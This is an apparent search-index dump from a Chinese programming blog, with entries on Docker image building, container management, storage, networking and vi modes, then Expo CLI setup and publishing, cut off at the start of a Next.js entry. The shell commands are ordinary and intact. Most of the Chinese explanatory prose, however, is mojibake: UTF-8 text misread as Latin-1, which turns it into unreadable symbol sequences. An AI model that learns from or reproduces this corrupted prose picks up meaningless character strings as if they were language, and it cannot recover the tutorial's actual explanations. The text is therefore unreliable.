å®šä¹‰æ¥æ„å»ºé•œåƒã€‚è¿™æ˜¯ä¸€ä¸ªæ˜¾ç¤ºæ„å»ºå‘½ä»¤çš„ç¤ºä¾‹ã€‚\ndocker build -t temp-ubuntu . æ„å»ºå‘½ä»¤ç”Ÿæˆçš„è¾“å‡ºï¼š\nSending build context to Docker daemon 4.69MB\rStep 1/8 : FROM ubuntu:18.04\r---\u0026gt; a2a15febcdf3\rStep 2/8 : RUN apt -y update \u0026amp;\u0026amp; apt install -y wget nginx software-properties-common apt-transport-https \u0026amp;\u0026amp; wget -q https://packages.microsoft.com/config/ubuntu/18.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb \u0026amp;\u0026amp; dpkg -i packages-microsoft-prod.deb \u0026amp;\u0026amp; add-apt-repository universe \u0026amp;\u0026amp; apt -y update \u0026amp;\u0026amp; apt install -y dotnet-sdk-3.0\r---\u0026gt; Using cache\r---\u0026gt; feb452bac55a\rStep 3/8 : CMD service nginx start\r---\u0026gt; Using cache\r---\u0026gt; ce3fd40bd13c\rStep 4/8 : COPY ./default /etc/nginx/sites-available/default\r---\u0026gt; 97ff0c042b03\rStep 5/8 : WORKDIR /app\r---\u0026gt; Running in 883f8dc5dcce\rRemoving intermediate container 883f8dc5dcce\r---\u0026gt; 6e36758d40b1\rStep 6/8 : COPY ./website/. .\r---\u0026gt; bfe84cc406a4\rStep 7/8 : EXPOSE 80:8080\r---\u0026gt; Running in b611a87425f2\rRemoving intermediate container b611a87425f2\r---\u0026gt; 209b54a9567f\rStep 8/8 : ENTRYPOINT [\u0026#34;dotnet\u0026#34;, \u0026#34;website.dll\u0026#34;]\r---\u0026gt; Running in ea2efbc6c375\rRemoving intermediate container ea2efbc6c375\r---\u0026gt; f982892ea056\rSuccessfully built f982892ea056\rSuccessfully tagged temp-ubuntu:latest è¯·æ³¨æ„è¾“å‡ºä¸­åˆ—å‡ºçš„æ­¥éª¤ã€‚å½“æ¯ä¸ªæ­¥éª¤æ‰§è¡Œæ—¶ï¼Œä¸€ä¸ªæ–°å±‚è¢«æ·»åŠ åˆ°æ­£åœ¨æ„å»ºçš„é•œåƒä¸­ã€‚\nå¦å¤–ï¼Œè¯·æ³¨æ„å½“ä¸­æ‰§è¡Œäº†è®¸å¤šå‘½ä»¤æ¥å®‰è£…è½¯ä»¶å’Œç®¡ç†é…ç½®ã€‚ä¾‹å¦‚ï¼Œåœ¨ç¬¬ 2 æ­¥ä¸­ï¼Œè¿è¡Œ apt -y update å’Œ apt install -y å‘½ä»¤æ¥æ›´æ–°æ“ä½œç³»ç»Ÿã€‚è¿™äº›å‘½ä»¤åœ¨ä¸ºè¯¥æ­¥éª¤åˆ›å»ºçš„æ­£åœ¨è¿è¡Œçš„å®¹å™¨ä¸­æ‰§è¡Œã€‚å‘½ä»¤è¿è¡Œåï¼Œä¸­é—´å®¹å™¨å°†è¢«åˆ é™¤ã€‚åº•å±‚ç¼“å­˜å›¾åƒä¿ç•™åœ¨æ„å»ºä¸»æœºä¸Šï¼Œä¸ä¼šè‡ªåŠ¨åˆ é™¤ã€‚è¿™ç§ä¼˜åŒ–å¯ç¡®ä¿ä»¥åçš„æ„å»ºé‡ç”¨è¿™äº›é•œåƒä»¥åŠ å¿«æ„å»ºæ—¶é—´ã€‚\n   é•œåƒç®¡ç† å‘½ä»¤ è¯´æ˜     æ„å»ºé•œåƒ docker build [OPTIONS] PATH è¯¥ PATH å‚æ•°å¯ä»¥å¼•ç”¨ä¸‰ç§èµ„æºï¼šGit å­˜å‚¨åº“ã€é¢„æ‰“åŒ…çš„å‹ç¼©åŒ… å’Œ çº¯æ–‡æœ¬æ–‡ä»¶ Dockerfileã€‚   1 docker build https://github.com/docker/rootfs.git#container:docker è¿è¡Œæ­¤å‘½ä»¤ä»¥ä½¿ç”¨åˆ†æ”¯ container ä¸­åä¸º docker çš„ç›®å½•   2 docker build http://server/context.tar.gz Docker å®ˆæŠ¤è¿›ç¨‹å°†è·å–context.tar.gzå¹¶å°†å…¶ç”¨ä½œæ„å»ºä¸Šä¸‹æ–‡ã€‚   3 åœ¨Dockerfileç›®å½•ä¸‹æ‰§è¡Œ docker build -t nginx:v3 . Dockerfile æ˜¯ä¸€ä¸ªç”¨æ¥æ„å»ºé•œåƒçš„æ–‡æœ¬æ–‡ä»¶ï¼Œæ–‡æœ¬å†…å®¹åŒ…å«äº†ä¸€æ¡æ¡æ„å»ºé•œåƒæ‰€éœ€çš„æŒ‡ä»¤å’Œè¯´æ˜ã€‚åœ¨ä¸€ä¸ªç©ºç›®å½•ä¸‹ mkdir Projectsï¼Œæ–°å»ºä¸€ä¸ªåä¸º Dockerfile æ–‡ä»¶ touch Dockerfile   æ ‡å¿—é•œåƒ docker build -t vieux/apache:2.0 . è¿™å°†åƒå‰é¢çš„ç¤ºä¾‹ä¸€æ ·æ„å»ºï¼Œä½†å®ƒå°†æ ‡è®°ç”Ÿæˆçš„é•œåƒã€‚å­˜å‚¨åº“åç§°ä¸º vieux/apacheï¼Œæ ‡ç­¾ä¸º 2.0.   ä¸Šä¸‹æ–‡è·¯å¾„ .  ä¸Šä¸‹æ–‡è·¯å¾„ï¼Œæ˜¯æŒ‡ docker åœ¨æ„å»ºé•œåƒï¼Œæœ‰æ—¶å€™æƒ³è¦ä½¿ç”¨åˆ°æœ¬æœºçš„æ–‡ä»¶ï¼ˆæ¯”å¦‚å¤åˆ¶ï¼‰ï¼Œdocker build å‘½ä»¤å¾—çŸ¥è¿™ä¸ªè·¯å¾„åï¼Œä¼šå°†è·¯å¾„ä¸‹çš„æ‰€æœ‰å†…å®¹æ‰“åŒ…ã€‚ä¸Šä¸‹æ–‡è·¯å¾„ä¸‹ä¸è¦æ”¾æ— ç”¨çš„æ–‡ä»¶ï¼Œå› ä¸ºä¼šä¸€èµ·æ‰“åŒ…å‘é€ç»™ docker å¼•æ“ï¼Œå¦‚æœæ–‡ä»¶è¿‡å¤šä¼šé€ æˆè¿‡ç¨‹ç¼“æ…¢ã€‚   åˆ—å‡ºé•œåƒ docker images åˆ—å‡ºæœ¬åœ°ä¸»æœºä¸Šçš„æ‰€æœ‰é•œåƒ   æŸ¥æ‰¾é•œåƒ docker search -f stars=3 ubuntu å¦‚æœæ˜¯ç”¨æˆ·åï¼Œåˆ™åˆ—å‡ºè‡ªå·±ä»“åº“çš„é•œåƒï¼Œå¦‚æœæ˜¯å…³é”®å­—(ä¾‹å¦‚ï¼šubuntu)ï¼Œåˆ™åˆ—å‡ºå…¬å…±ä»“åº“çš„æ‰€æœ‰å…³äºubuntuçš„é•œåƒï¼Œé€‰é¡¹ --limit æœ€å¤§ç»“æœæœç´¢æ•°   æ‹‰å–é•œåƒ docker pull ubuntu:20.04 æŒ‡å®šæ‹‰å–çš„ç”¨æˆ·å/é•œåƒå:æ ‡ç­¾åï¼Œä¹Ÿå¯ä»¥ docker pull ubuntu ï¼Œä¸æŒ‡å®šåˆ™é»˜è®¤ä¸‹è½½å…¬å…±ä»“åº“ä¸­å­˜åœ¨çš„ ubuntu:latest æœ€æ–°ç‰ˆï¼Œé€‰é¡¹ -a ä¸‹è½½å­˜å‚¨åº“ä¸­æ‰€æœ‰æ ‡è®°çš„é•œåƒ   æ¨é€é•œåƒ docker push username/ubuntu:18.04 æ¨é€æœ¬åœ°çš„é•œåƒåˆ°è¿œç¨‹ä»“åº“ï¼Œå‰ææ˜¯å·²åœ¨æœ¬åœ°ç™»å½•ï¼Œé€‰é¡¹ -a æ¨é€å­˜å‚¨åº“ä¸­çš„æ‰€æœ‰æ ‡è®°å›¾åƒ   åˆ é™¤é•œåƒ docker rmi [OPTIONS] IMAGE [IMAGE...] ä»ä¸»æœºèŠ‚ç‚¹ä¸­åˆ é™¤ï¼ˆå’Œå–æ¶ˆæ ‡è®°ï¼‰ä¸€ä¸ªæˆ–å¤šä¸ªé•œåƒã€‚å¦‚æœä¸€ä¸ªé•œåƒæœ‰å¤šä¸ªæ ‡ç­¾ï¼Œä½¿ç”¨è¿™ä¸ªå¸¦æœ‰æ ‡ç­¾ä½œä¸ºå‚æ•°çš„å‘½ä»¤åªä¼šåˆ é™¤æ ‡ç­¾ã€‚å¦‚æœæ ‡ç­¾æ˜¯é•œåƒçš„å”¯ä¸€æ ‡ç­¾ï¼Œåˆ™é•œåƒå’Œæ ‡ç­¾éƒ½å°†è¢«åˆ é™¤ã€‚è¿™ä¸ä¼šä»æ³¨å†Œè¡¨ä¸­åˆ é™¤é•œåƒã€‚é™¤éä½¿ç”¨ -f é€‰é¡¹ï¼Œå¦åˆ™æ— æ³•åˆ é™¤æ­£åœ¨è¿è¡Œçš„å®¹å™¨çš„é•œåƒã€‚    4. Docker å®¹å™¨çš„å·¥ä½œåŸç† å®¹å™¨æ˜¯ç”¨æ¥åˆ†å‘åº”ç”¨ç¨‹åºçš„å•å…ƒã€‚å®¹å™¨æ˜¯ç‹¬ç«‹è¿è¡Œçš„ä¸€ä¸ªæˆ–ä¸€ç»„åº”ç”¨ï¼Œæ˜¯ é•œåƒè¿è¡Œæ—¶çš„å®ä½“ã€‚\n4-1. å®¹å™¨ç®¡ç† å®¹å™¨æœ‰ä¸€ä¸ªç”Ÿå‘½å‘¨æœŸï¼Œå¯ä»¥ç®¡ç†å’Œè·Ÿè¸ªå®¹å™¨çš„çŠ¶æ€ã€‚\n   å‘½ä»¤ è¯´æ˜     run å¯åŠ¨è¿è¡Œå®¹å™¨   pause æš‚åœæ­£åœ¨è¿è¡Œçš„å®¹å™¨   stop åœæ­¢æ­£åœ¨è¿è¡Œçš„å®¹å™¨   kill ç»ˆæ­¢æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼Œæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ä¸ä¼šæ•è·ç»ˆæ­¢ä¿¡å·   remove åˆ é™¤å¤„äºåœæ­¢çŠ¶æ€çš„å®¹å™¨       å®¹å™¨ç®¡ç† å‘½ä»¤     è¿è¡Œå®¹å™¨ docker run -itd --name ubuntu-test ubuntu /bin/bash   åˆ—å‡ºå®¹å™¨(æ‰€æœ‰) docker ps -a   åˆ—å‡ºå®¹å™¨(è¿è¡Œ) docker ps   å¯åŠ¨å®¹å™¨ docker start my_container   åœæ­¢å®¹å™¨ docker stop my_container   é‡å¯å®¹å™¨ docker restart my_container   æš‚åœå®¹å™¨ docker pause my_container   å–æ¶ˆæš‚åœ docker unpause my_container   è¿›å…¥å®¹å™¨ docker exec -it my_container /bin/bash   é€€å‡ºå®¹å™¨ exit   å¯¼å‡ºå®¹å™¨ docker export my_container \u0026gt; ubuntu.tar   ä»è¿œç¨‹ä»“åº“å¯¼å…¥å®¹å™¨ docker import https://example.com/exampleimage.tgz   ä»æœ¬åœ°æ–‡ä»¶å¯¼å…¥å®¹å™¨ cat exampleimage.tgz | docker import - exampleimagelocal:new   ä»æœ¬åœ°ç›®å½•å¯¼å…¥å®¹å™¨ sudo tar -c . | docker import - exampleimagedir   ä»å…·æœ‰æ–°é…ç½®çš„æœ¬åœ°ç›®å½•å¯¼å…¥å®¹å™¨ sudo tar -c . | docker import --change \u0026quot;ENV DEBUG=true\u0026quot; - exampleimagedir   åˆ é™¤å®¹å™¨(éè¿è¡Œ) docker rm my_container   åˆ é™¤å®¹å™¨(è¿è¡Œ) docker rm -f my_container   åˆ é™¤æ‰€æœ‰å®¹å™¨(éè¿è¡Œ) docker container prune    4-2. å®¹å™¨å­˜å‚¨é…ç½® åœ¨è€ƒè™‘å­˜å‚¨æ•°æ®æ—¶ï¼Œå§‹ç»ˆå°†å®¹å™¨è§†ä¸ºä¸´æ—¶å®¹å™¨è‡³å…³é‡è¦ã€‚\nå®¹å™¨å­˜å‚¨å³å®¹å™¨æ–‡ä»¶ç³»ç»Ÿï¼Œå½“åº”ç”¨ç¨‹åºå°†æ•°æ®å†™å…¥æ—¥å¿—æ–‡ä»¶æ—¶ï¼Œç³»ç»Ÿä¼šå°†æ•°æ®å†™å…¥å¯å†™çš„å®¹å™¨å±‚ã€‚\nå°½ç®¡è¿™ç§æ–¹æ³•æœ‰æ•ˆï¼Œä½†æ˜¯ä¸å¹¸çš„æ˜¯ï¼Œå®ƒå­˜åœ¨å‡ ä¸ªç¼ºç‚¹ï¼š\n   ç¼ºç‚¹ è¯´æ˜     å®¹å™¨å­˜å‚¨æ˜¯ä¸´æ—¶çš„ æ—¥å¿—æ–‡ä»¶ä¸ä¼šåœ¨å®¹å™¨å®ä¾‹ä¹‹é—´ä¿ç•™ã€‚ä¾‹å¦‚ï¼Œå‡è®¾åœæ­¢å¹¶ç§»é™¤å®¹å™¨ã€‚å½“å¯åŠ¨æ–°çš„å®¹å™¨å®ä¾‹æ—¶ï¼Œæ–°å®ä¾‹ä¼šåŸºäºæŒ‡å®šçš„é•œåƒï¼Œä¹‹å‰çš„æ‰€æœ‰æ•°æ®éƒ½å°†ä¸¢å¤±ã€‚è¯·è®°ä½ï¼Œå½“ç§»é™¤å®¹å™¨æ—¶ï¼Œå®¹å™¨ä¸­çš„æ‰€æœ‰æ•°æ®éƒ½ä¼šéšå®¹å™¨ä¸€èµ·é”€æ¯ã€‚   å®¹å™¨å­˜å‚¨ä¸åº•å±‚å®¿ä¸»æœºè€¦åˆ ç”±äºå®¹å™¨ä¸åº•å±‚ä¸»æœºè€¦åˆï¼Œå› æ­¤å¾ˆéš¾ä»å®¹å™¨è®¿é—®æˆ–ç§»åŠ¨æ—¥å¿—æ–‡ä»¶ã€‚å¿…é¡»è¿æ¥åˆ°å®¹å™¨å®ä¾‹æ‰èƒ½è®¿é—®è¯¥æ–‡ä»¶ã€‚   å®¹å™¨å­˜å‚¨é©±åŠ¨å™¨çš„æ€§èƒ½è¾ƒä½ å®¹å™¨å®ç°äº†ä¸€ä¸ªå­˜å‚¨é©±åŠ¨ç¨‹åºä»¥å…è®¸åº”ç”¨ç¨‹åºå†™å…¥æ•°æ®ã€‚è¯¥é©±åŠ¨ç¨‹åºå¼•å…¥äº†ä¸€ä¸ªé¢å¤–çš„æŠ½è±¡æ¥ä¸ä¸»æœºæ“ä½œç³»ç»Ÿå†…æ ¸è¿›è¡Œé€šä¿¡ï¼Œå¹¶ä¸”æ€§èƒ½ä¸å¦‚ç›´æ¥å†™å…¥ä¸»æœºæ–‡ä»¶ç³»ç»Ÿã€‚    å®¹å™¨å¯ä»¥ä½¿ç”¨ä¸¤ä¸ªé€‰é¡¹æ¥æŒä¹…åŒ–æ•°æ®ã€‚ç¬¬ä¸€ä¸ªé€‰é¡¹æ˜¯ä½¿ç”¨ *å·* ï¼Œç¬¬äºŒä¸ªé€‰é¡¹æ˜¯ *ç»‘å®šå®‰è£…* ã€‚\n   é€‰é¡¹ å‘½ä»¤ è¯´æ˜     å·å­˜å‚¨ docker volume create å·è¢«è®¤ä¸ºæ˜¯ä¸å®¹å™¨ä¸€èµ·ä½¿ç”¨çš„é¦–é€‰æ•°æ®å­˜å‚¨ç­–ç•¥ï¼Œå¤šä¸ªå®¹å™¨å¯ä»¥åŒæ—¶ä½¿ç”¨ç›¸åŒçš„å·ã€‚å½“å®¹å™¨è¢«åˆ é™¤æ—¶ï¼Œå·ä¹Ÿä¸ä¼šè‡ªåŠ¨åˆ é™¤ã€‚   ç»‘å®šæŒ‚è½½  ç»‘å®šæŒ‚è½½åœ¨æ¦‚å¿µä¸Šä¸å·ç›¸åŒï¼Œä½†æ˜¯ï¼Œå¯ä»¥æŒ‚è½½ä¸»æœºä¸Šçš„ä»»ä½•æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ç‰¹å®šæ–‡ä»¶å¤¹ã€‚ä¸»æœºä¹Ÿå¯ä»¥æ›´æ”¹è¿™äº›æŒ‚è½½çš„å†…å®¹ã€‚ä¸å·ç›¸æ¯”ï¼Œç»‘å®šæŒ‚è½½çš„åŠŸèƒ½æœ‰é™ï¼Œå°½ç®¡å®ƒä»¬çš„æ€§èƒ½æ›´é«˜ï¼Œä½†å®ƒä»¬ä¾èµ–äºå…·æœ‰ç‰¹å®šæ–‡ä»¶å¤¹ç»“æ„çš„ä¸»æœºã€‚    4-3. å®¹å™¨ç½‘ç»œé…ç½® é»˜è®¤çš„ Docker ç½‘ç»œé…ç½®å…è®¸éš”ç¦» Docker ä¸»æœºä¸Šçš„å®¹å™¨ã€‚æ­¤åŠŸèƒ½èƒ½å¤Ÿæ„å»ºå’Œé…ç½®å¯ä»¥å®‰å…¨åœ°ç›¸äº’é€šä¿¡çš„åº”ç”¨ç¨‹åºã€‚\nDocker æä¾›äº†ä¸‰ç§é¢„é…ç½®çš„ç½‘ç»œé…ç½®ã€‚\nå¯ä»¥æ ¹æ®å®¹å™¨çš„ç½‘ç»œè¦æ±‚é€‰æ‹©å°†è¿™äº›ç½‘ç»œé…ç½®ä¸­çš„å“ªäº›åº”ç”¨äºå®¹å™¨ã€‚\n   é€‰é¡¹ è¯´æ˜     Bridge æ¡¥æ¥ç½‘ç»œæ˜¯å¯åŠ¨æ—¶åº”ç”¨äºå®¹å™¨çš„é»˜è®¤é…ç½®ï¼Œæ— éœ€æŒ‡å®šä»»ä½•é¢å¤–çš„ç½‘ç»œé…ç½®ã€‚è¯¥ç½‘ç»œæ˜¯å®¹å™¨ä½¿ç”¨çš„å†…éƒ¨ç§æœ‰ç½‘ç»œï¼Œå°†å®¹å™¨ç½‘ç»œä¸ Docker ä¸»æœºç½‘ç»œéš”ç¦»å¼€æ¥ã€‚æ¡¥æ¥ç½‘ç»œä¸­çš„æ¯ä¸ªå®¹å™¨éƒ½è¢«åˆ†é…äº†ä¸€ä¸ª IP åœ°å€å’Œå­ç½‘æ©ç ï¼Œä¸»æœºåé»˜è®¤ä¸ºå®¹å™¨åç§°ã€‚å…è®¸è¿æ¥åˆ°é»˜è®¤ç½‘æ¡¥ç½‘ç»œçš„å®¹å™¨é€šè¿‡ IP åœ°å€è®¿é—®å…¶ä»–ç½‘æ¡¥è¿æ¥çš„å®¹å™¨ã€‚æ¡¥æ¥ç½‘ç»œä¸å…è®¸ä½¿ç”¨ä¸»æœºååœ¨å®¹å™¨ä¹‹é—´è¿›è¡Œé€šä¿¡ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒDocker ä¸å‘å¸ƒä»»ä½•å®¹å™¨ç«¯å£ã€‚è¦å¯ç”¨å®¹å™¨ç«¯å£å’Œ Docker ä¸»æœºç«¯å£ä¹‹é—´çš„ç«¯å£æ˜ å°„ï¼Œè¯·ä½¿ç”¨ Docker ç«¯å£\u0026ndash;publishæ ‡å¿—ã€‚å‘å¸ƒæ ‡å¿—æœ‰æ•ˆåœ°é…ç½®äº†æ˜ å°„ç«¯å£çš„é˜²ç«å¢™è§„åˆ™ã€‚--publish 8080:80ä»»ä½•æµè§ˆåˆ° Docker ä¸»æœº IP å’Œç«¯å£ 8080 çš„å®¢æˆ·ç«¯éƒ½å¯ä»¥è®¿é—®è·Ÿè¸ªé—¨æˆ·ã€‚   Host ä¸»æœºç½‘ç»œå¯ä»¥ç›´æ¥åœ¨ä¸»æœºç½‘ç»œä¸Šè¿è¡Œå®¹å™¨ã€‚è¿™ç§é…ç½®åœ¨ç½‘ç»œçº§åˆ«æœ‰æ•ˆåœ°æ¶ˆé™¤äº†ä¸»æœºå’Œå®¹å™¨ä¹‹é—´çš„éš”ç¦»ã€‚åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œå‡è®¾å†³å®šå°†ç½‘ç»œé…ç½®æ›´æ”¹ä¸ºä¸»æœºç½‘ç»œé€‰é¡¹ã€‚é—¨æˆ·ä»ç„¶å¯ä»¥ä½¿ç”¨ä¸»æœº IP è®¿é—®ã€‚å¯ä»¥ä½¿ç”¨ä¼—æ‰€å‘¨çŸ¥çš„ç«¯å£ 80 è€Œä¸æ˜¯æ˜ å°„ç«¯å£ã€‚è¯·è®°ä½ï¼Œå®¹å™¨åªèƒ½ä½¿ç”¨ä¸»æœºå°šæœªä½¿ç”¨çš„ç«¯å£ã€‚   none è¦ç¦ç”¨å®¹å™¨çš„ç½‘ç»œï¼Œè¯·ä½¿ç”¨ none ç½‘ç»œé€‰é¡¹ã€‚     æ“ä½œç³»ç»Ÿæ³¨æ„äº‹é¡¹  è¯·è®°ä½ï¼ŒDocker ç½‘ç»œé…ç½®é€‰é¡¹çš„æ¡Œé¢æ“ä½œç³»ç»Ÿä¹‹é—´å­˜åœ¨å·®å¼‚ã€‚ä¾‹å¦‚ï¼ŒDocker0ç½‘ç»œæ¥å£åœ¨ä½¿ç”¨æ¡¥æ¥ç½‘ç»œæ—¶åœ¨ macOS ä¸Šä¸å¯ç”¨ï¼Œå¹¶ä¸” Windows å’Œ macOS æ¡Œé¢éƒ½ä¸æ”¯æŒä½¿ç”¨ä¸»æœºç½‘ç»œé…ç½®ã€‚\n5. æ›´å¤šè¯¦æƒ… é™„ä¸Š vi/vim åŸºæœ¬ä¸Š vi/vim å…±åˆ†ä¸ºä¸‰ç§æ¨¡å¼ï¼Œåˆ†åˆ«æ˜¯ å‘½ä»¤æ¨¡å¼ï¼ˆCommand modeï¼‰ ï¼Œ è¾“å…¥æ¨¡å¼ï¼ˆInsert modeï¼‰ å’Œ åº•çº¿å‘½ä»¤æ¨¡å¼ï¼ˆLast line modeï¼‰ ã€‚ è¿™ä¸‰ç§æ¨¡å¼çš„ä½œç”¨åˆ†åˆ«æ˜¯ï¼š\n   æ¨¡å¼ è¿›å…¥å’Œé€€å‡º     å‘½ä»¤æ¨¡å¼ vi \u0026lt;æ–‡ä»¶\u0026gt; , é€€å‡ºvi :exit æˆ–è€… :q æˆ–è€… :wq   è¾“å…¥æ¨¡å¼ å‘½ä»¤æ¨¡å¼ä¸‹ i ã€‚é€€å‡ºè¾“å…¥æ¨¡å¼ ESC   åº•çº¿æ¨¡å¼ å‘½ä»¤æ¨¡å¼ä¸‹ :ï¼ˆè‹±æ–‡å†’å·ï¼‰ã€‚é€€å‡ºåº•çº¿æ¨¡å¼ ECS    ","description":"Dockeræ˜¯ä¸€ä¸ªåº”ç”¨å±‚çš„æŠ½è±¡å®¹å™¨ï¼Œå°†ä»£ç å’Œä¾èµ–æ‰“åŒ…åœ¨ä¸€èµ·ã€‚ä¾¿æºé«˜æ•ˆã€‚","id":13,"section":"nodejs","tags":null,"title":"Docker","uri":"https://codthing.github.io/nodejs/docker/docker/"},{"content":"ä¸€ã€è¿è¡Œè®¾å¤‡  Expoå®¢æˆ·ç«¯App æµè§ˆå™¨ æ¨¡æ‹Ÿå™¨(ä½¿ç”¨genymotion)   ä¸‹è½½å¹¶å®‰è£… Android Studio 3.0+\nåœ¨Android Studioä¸­ï¼Œè½¬åˆ°é¦–é€‰é¡¹\u0026gt;å¤–è§‚å’Œè¡Œä¸º\u0026gt;ç³»ç»Ÿè®¾ç½®\u0026gt; Android SDKã€‚å•å‡» SDKå·¥å…·é€‰é¡¹å¡ï¼Œå¹¶ç¡®ä¿å·²å®‰è£…è‡³å°‘ä¸€ä¸ªç‰ˆæœ¬çš„Android SDK Build-Tools\nè®¾å®šè™šæ‹Ÿè®¾å¤‡\n äºŒã€å®‰è£… npm install --global expo-cli ä¸‰ã€éªŒè¯ç™»å½• expo whoami å››ã€åˆ›å»ºé¡¹ç›® expo init my-app æœ‰5ç§æ¨¡æ¿å¯ä»¥é€‰æ‹©ï¼š\n--- Managed workflow æ‰˜ç®¡å·¥ä½œæµ ---\r  blank åƒç©ºç”»å¸ƒä¸€æ ·å¹²å‡€çš„æœ€å°åº”ç”¨ç¨‹åºã€‚ blank (TypeScript) ä¸ç©ºç”»å¸ƒç›¸åŒï¼Œä½†å…·æœ‰TypeScripté…ç½®ã€‚ tabs (TypeScript) ä½¿ç”¨react-navigationå’ŒTypeScriptçš„å‡ ä¸ªç¤ºä¾‹å±å¹•å’Œé€‰é¡¹å¡ã€‚\n\u0026mdash; Bare workflow è£¸æ¼å·¥ä½œæµ \u0026mdash; minimal å…‰ç§ƒç§ƒçš„ï¼Œæœ€å°çš„ï¼Œåªæ˜¯ä½¿æ‚¨å…¥é—¨çš„åŸºæœ¬è¦ç´ ã€‚ minimal (TypeScript) ï¼šä¸æœ€å°ç›¸åŒï¼Œä½†å…·æœ‰TypeScripté…ç½®  äº”ã€å¯åŠ¨å¼€å‘æœåŠ¡å™¨ expo start å…­ã€åœ¨æ‰‹æœº/æ¨¡æ‹Ÿå™¨/æµè§ˆå™¨ä¸Šæ‰“å¼€åº”ç”¨  Expo Appï¼šé“¾æ¥æ–¹å¼ï¼šéš§é“Tunnel å±€åŸŸç½‘LAN æœ¬åœ°Local.é€‰æ‹©TunneläºŒç»´ç æ‰«æ æ¨¡æ‹Ÿå™¨ï¼šExpo å‘½ä»¤è¡Œçª—å£é”®å…¥ a æµè§ˆå™¨ï¼šExpo å‘½ä»¤è¡Œçª—å£é”®å…¥ w  ä¸ƒã€æ„å»º //android\rexpo build:android\r//IOS\rexpo build:ios  ä½¿ç”¨Expoåˆ™æ˜¯ä½¿ç”¨äº†æ‰˜ç®¡å·¥ä½œæµ ï¼ˆåŒºåˆ«äºè£¸æ¼å·¥ä½œæµï¼‰ï¼Œæ‰€ä»¥æ„å»ºåçš„apkä¿å­˜åœ¨Expoè´¦æˆ·ä¸­ï¼Œ30å¤©åï¼Œå°†è‡ªåŠ¨ä»ExpoæœåŠ¡å™¨ä¸­æ¸…é™¤æ„å»ºä½œä¸šå·¥ä»¶ï¼Œä¾‹å¦‚äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆ.ipaï¼Œ.aabï¼Œ.apkç­‰ï¼‰å’Œæ—¥å¿—æ–‡ä»¶ï¼Œä¸‹è½½å¹¶éƒ¨ç½²çš„åº”ç”¨ç¨‹åºäºŒè¿›åˆ¶æ–‡ä»¶å°†å§‹ç»ˆå¯ä»¥æ­£å¸¸è¿è¡Œï¼\n å…«ã€å‡çº§Expo //å‡çº§SDK\rexpo upgrade\r//å‡çº§expo-cli\rnpm i -g expo-cli ä¹ã€é€€å‡º Expo æœåŠ¡ //é”®ç›˜\rCtrl + C åã€Expo å‘½ä»¤è¡Œ â€º æŒ‰ï¼Ÿâ”‚ æ˜¾ç¤ºæ‰€æœ‰å‘½ä»¤\nâ€º æŒ‰aâ”‚æ‰“å¼€Android\nâ€º shift + aâ”‚é€‰æ‹©è®¾å¤‡æˆ–ä»¿çœŸå™¨\nâ€º æŒ‰wâ”‚æ‰“å¼€ç½‘é¡µ\nâ€º æŒ‰oâ”‚åœ¨ç¼–è¾‘å™¨ä¸­æ‰“å¼€é¡¹ç›®ä»£ç \nâ€º æŒ‰câ”‚æ˜¾ç¤ºé¡¹ç›®QR\nâ€º æŒ‰pâ”‚åˆ‡æ¢æ„å»ºæ¨¡å¼ï¼ˆå¼€å‘ï¼‰\nâ€º æŒ‰râ”‚é‡æ–°å¯åŠ¨æ†ç»‘å™¨\nâ€º shift + râ”‚é‡æ–°å¯åŠ¨å¹¶æ¸…é™¤ç¼“å­˜\nâ€º æŒ‰dâ”‚æ‰“å¼€Expo DevTools\nâ€º shift + dâ”‚åœ¨å¯åŠ¨æ—¶åˆ‡æ¢è‡ªåŠ¨æ‰“å¼€DevToolsï¼ˆå·²å¯ç”¨ï¼‰\nâ€º æŒ‰eâ”‚é€šè¿‡ç”µå­é‚®ä»¶å…±äº«åº”ç”¨ç¨‹åºé“¾æ¥\nåä¸€ã€æ¯ä¸ªåº”ç”¨ç¨‹åºéƒ½ç”± React Nativeï¼ŒExpo SDK å’Œ ç¬¬ä¸‰æ–¹åº“ ç»„åˆç»„æˆã€‚ åäºŒã€å¼€å‘/ç”Ÿäº§æ–¹å¼åˆ‡æ¢ åä¸‰ã€å‘å¸ƒæ›´æ–° ä¼˜åŒ–ä»£ç ï¼ˆå‹ç¼©å›¾ç‰‡ç­‰ï¼‰ï¼šnpx expo-optimize\né€šè¿‡å‘½ä»¤è¡Œå‘å¸ƒï¼šexpo publish æ‰§è¡Œæ­¤æ“ä½œæ—¶ï¼Œæ‰“åŒ…ç¨‹åºå°†å‹ç¼©æ‰€æœ‰ä»£ç å¹¶ç”Ÿæˆä¸¤ä¸ªç‰ˆæœ¬çš„ä»£ç ï¼ˆä¸€ä¸ªç‰ˆæœ¬ç”¨äºiOSï¼Œä¸€ä¸ªç‰ˆæœ¬ç”¨äºAndroidï¼‰ï¼Œç„¶åå°†å…¶ä¸Šä¼ åˆ°CDNã€‚æ‚¨å°†è·å¾—ä¸€ä¸ªé“¾æ¥ï¼Œä¾‹å¦‚https://exp.host/@ccheever/an-example ï¼Œä»»ä½•äººéƒ½å¯ä»¥ä»ä¸­åŠ è½½æ‚¨çš„é¡¹ã€‚\né€šè¿‡Expo Dev Toolså‘å¸ƒï¼š\n é€‰æ‹©å¼€å‘æ–¹å¼\u0026amp;Tunnelåˆ™å‘å¸ƒåˆ°ExpoAppä¸­ç”¨äºå¼€å‘æµ‹è¯•ã€‚ é€‰æ‹©ç”Ÿäº§æ–¹å¼\u0026amp;Tunnelåˆ™å‘å¸ƒåˆ°ç”¨æˆ·Appçš„ç”Ÿäº§ç¯å¢ƒä¸­ã€‚ å¯¹åº”ç”¨ç¨‹åºå›¾æ ‡ç­‰åœ¨app.jsoné…ç½®çš„å†…å®¹åˆ™éœ€è¦é‡æ–°æ‰“åŒ…æ‰æœ‰æ•ˆï¼Œé€šè¿‡å‘å¸ƒæ›´æ–°æ— æ•ˆã€‚  ","description":"","id":14,"section":"react-native","tags":null,"title":"Expo åŸºç¡€","uri":"https://codthing.github.io/react-native/expo/expo-base/"},{"content":"Next.jsï¼šReact æ¡†æ¶\nNext.js 